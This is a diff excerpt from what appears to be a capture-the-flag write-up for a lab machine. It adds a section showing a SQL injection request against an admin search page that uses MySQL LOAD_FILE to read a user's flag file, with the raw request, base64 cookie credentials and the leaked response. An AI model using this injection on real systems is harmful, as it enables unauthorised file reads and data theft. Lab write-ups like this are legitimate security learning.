@@ -165,4 +165,53 @@ I don't know why this worked and Osanda's did not. Obviously it uses a system co
 
 Also, this hash does not seem crackable, taking note that we have another user named `Cortin.`
 
+## XAMPP?
+I recall seeing a XAMPP error page at some point. There could be a possibility of arbitrary file read if I can figure out where the XAMPP files are stored.
+Source code to the Backdoor Checker would be a huge benefit.
+
+Reading files with MySQL: https://www.w3resource.com/mysql/string-functions/mysql-load_file-function.php
+
+I tried to read the hosts file but this does not seem to work. It might be possible to read user.txt from Cortin's home directory.
+```http
+Request:
+POST /admin/search.php HTTP/1.1
+Host: 10.10.10.154
+Content-Length: 78
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
+Content-type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://10.10.10.154
+Referer: http://10.10.10.154/admin/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
+Connection: close
+
+term=1'union select load_file('C:\\Users\\Cortin\\Desktop\\user.txt'),2,3;-- -
+
+
+Response:
+HTTP/1.1 200 OK
+Date: Sun, 30 Jul 2023 08:54:00 GMT
+Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
+X-Powered-By: PHP/7.3.4
+Content-Length: 203
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<table width='90%'><tr><th>ID</th><th>User</th></tr>
+		<tr>
+		    <td>1</td>
+		    <td>admin</td>
+		 </tr>
+		
+		<tr>
+		    <td>c4c8de4162aa03152f52aecc122e6c1f
+</td>
+		    <td>2</td>
+		 </tr>
+		</table>
+```
+
+With this kind of file read, it could be possible to fuzz for common file names. However, I'm not going to do that because it seems silly in this context.
 
